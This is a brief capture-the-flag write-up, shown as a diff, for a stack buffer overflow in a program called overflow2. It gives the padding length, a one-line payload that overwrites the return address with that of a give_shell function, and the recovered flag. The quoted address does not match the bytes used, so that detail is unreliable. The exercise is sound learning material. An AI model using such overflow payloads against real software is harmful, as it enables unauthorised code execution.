@@ -1,0 +1,9 @@
+After playing around a little bit, we find that we have to overflow 28 bytes
+to get to the return address.
+
+Using gdb, we find that the address for give_shell is 0x84048dd, so let's do the rop.
+
+$ ./overflow2 $(python -c "print 'A'*28 + '\xdd\x84\x04\x08'")
+$ cat flag.txt
+
+youre_lucky_i_left_that_function_for_you
